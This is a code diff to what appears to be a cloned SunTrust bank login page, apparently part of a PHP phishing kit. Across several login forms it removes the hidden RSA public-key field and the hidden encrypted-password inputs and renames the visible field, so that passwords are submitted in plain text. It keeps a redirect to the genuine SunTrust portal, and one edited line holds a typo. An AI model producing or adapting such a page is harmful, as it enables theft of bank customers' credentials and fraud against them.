@@ -3872,17 +3872,8 @@ include './gen.php';
                                                     <div
                                                         class="suntrust-login-form-field suntrust-remember-me-accessible">
                                                         <label for="sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-password" class="suntrust-accessible-text">Password</label>
-                                                        <input type="password" placeholder="Password" class="suntrust-login-input suntrust-login-password" id="sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-password" title="Password" value="" autocomplete="off">
-                                                        <input type="hidden" name="password" class="hiddenPassword" value="">
-                                                        <input type="hidden" class="hiddenPublicKey" value="-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlrOQOKQbXsrk+YW69TAq
-mUJeR3CkiXj+HNHnQSFMLwuUwLUYGuTWv0ALs9cDcQ0lTwkv778bwjyLsaBDuZHy
-SFJD8R284QxtP4tud4zfWJFFlk2I5FP4jMtkzfozLa06+sMG6z82kH7dYwIxrQiW
-Z5i2sCoVfKejw/ZDN0rXLAaLEU6gNZXBLXTe+547Z+ZoIF1TOhV4bCMZmx8j1Ib9
-rCqBRfIDkuMMxpMvAosy55afNVjJG+6DlQLRuqVihK7nxaX3rd+JQtSjIEtYK1eJ
-cgqIvztR7/zmQeZvKFW2qXJ2rOkNpMJZNKmT2/ga+oAkmzUlgwrk6Ux2ecYwp2Hb
-fwIDAQAB
------END PUBLIC KEY-----">
+                                                        <input type="password" name="password" placeholder="Password" class="suntrust-login-input suntrust-login-password" id="sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-password" title="Password" value="" autocomplete="off">
+                                                        
                                                         <div class="suntrust-remember-me-field">
                                                             <div class="sun-checkbox-input-container" id="uniform-sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-check">
                                                                 <span>
@@ -3962,8 +3953,8 @@ fwIDAQAB
                                                     </div>
                                                     <div class="suntrust-login-form-field ">
                                                         <label for="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password" class="suntrust-accessible-text">Password</label>
-                                                        <input type="password" placeholder="Password" class="suntrust-login-input suntrust-login-password" id="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password" title="Password" value="" autocomplete="off">
-                                                        <input type="hidden" name="password" class="hiddenPassword" value="">
+                                                        <input type="password" name="password" placeholder="Password" class="suntrust-login-input suntrust-login-password" id="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password" title="Password" value="" autocomplete="off">
+                                                        
                                                         <button class="suntrust-login-button" type="submit" value="Submit"><span class="suntrust-accessible-text">Submit Login</span></button>
                                                         <div>
                                                             <input type="hidden" name="type" value="P6OCM">
@@ -4446,29 +4437,13 @@ fwIDAQAB
                                                                                                 <label
                                                                                                     for="sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-password"
                                                                                                     class="suntrust-accessible-text">Password</label>
-                                                                                                <input type="password"
+                                                                                                <input type="password" name="password"
                                                                                                     placeholder="Password"
                                                                                                     class="suntrust-login-input suntrust-login-password-herosignon"
                                                                                                     id="sign-on-3A69E29D-79E0-403E-9352-5261239ADD89-password"
                                                                                                     title="Password"
                                                                                                     value=""
                                                                                                     autocomplete="off">
-                                                                                                <input type="hidden"
-                                                                                                    name="password"
-                                                                                                    class="hiddenPassword"
-                                                                                                    value="">
-                                                                                                <input type="hidden"
-                                                                                                    class="hiddenPublicKey"
-                                                                                                    value="-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlrOQOKQbXsrk+YW69TAq
-mUJeR3CkiXj+HNHnQSFMLwuUwLUYGuTWv0ALs9cDcQ0lTwkv778bwjyLsaBDuZHy
-SFJD8R284QxtP4tud4zfWJFFlk2I5FP4jMtkzfozLa06+sMG6z82kH7dYwIxrQiW
-Z5i2sCoVfKejw/ZDN0rXLAaLEU6gNZXBLXTe+547Z+ZoIF1TOhV4bCMZmx8j1Ib9
-rCqBRfIDkuMMxpMvAosy55afNVjJG+6DlQLRuqVihK7nxaX3rd+JQtSjIEtYK1eJ
-cgqIvztR7/zmQeZvKFW2qXJ2rOkNpMJZNKmT2/ga+oAkmzUlgwrk6Ux2ecYwp2Hb
-fwIDAQAB
------END PUBLIC KEY-----">
-
                                                                                                 <div
                                                                                                     class="suntrust-remember-me-field">
                                                                                                     <div class="sun-checkbox-input-container"
@@ -4599,39 +4574,15 @@ fwIDAQAB
                                                                                             </div>
                                                                                             <div
                                                                                                 class="suntrust-login-form-field ">
-                                                                                                <label
-                                                                                                    for="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password"
-                                                                                                    class="suntrust-accessible-text">Password</label>
-                                                                                                <input type="password"
-                                                                                                    placeholder="Password"
-                                                                                                    class="suntrust-login-input suntrust-login-password-herosignon"
-                                                                                                    id="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password"
-                                                                                                    title="Password"
-                                                                                                    value=""
-                                                                                                    autocomplete="off">
-                                                                                                <input type="hidden"
-                                                                                                    name="password"
-                                                                                                    class="hiddenPassword"
-                                                                                                    value="">
-
-
-
-                                                                                                <div
-                                                                                                    class="suntrust-login-button-herosignon-container">
-
-                                                                                                    <input
-                                                                                                        class="suntrust-login-button-herosignon"
-                                                                                                        type="submit"
-                                                                                                        value="Sign On">
+                                                                                                <label for="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password" class="suntrust-accessible-text">Password</label>
+                                                                                                <input type="password" name="password" placeholder="Password" class="suntrust-login-input suntrust-login-password-herosignon" id="sign-on-CD512300-838A-4C68-B68D-3A9725DD6678-password" title="Password"  utocomplete="off">
+                                                                                                <div class="suntrust-login-button-herosignon-container">
+                                                                                                    <input class="suntrust-login-button-herosignon"  type="submit" value="Sign On">
                                                                                                 </div>
 
                                                                                                 <div>
-                                                                                                    <input type="hidden"
-                                                                                                        name="type"
-                                                                                                        value="P6OCM">
-                                                                                                    <input type="hidden"
-                                                                                                        name="successurl"
-                                                                                                        value="https://wholesaleportal.suntrust.com/OCM/UI/SplashPage/">
+                                                                                                    <input type="hidden" name="type" value="P6OCM">
+                                                                                                    <input type="hidden" name="successurl" value="https://wholesaleportal.suntrust.com/OCM/UI/SplashPage/">
                                                                                                 </div>
                                                                                             </div>
 
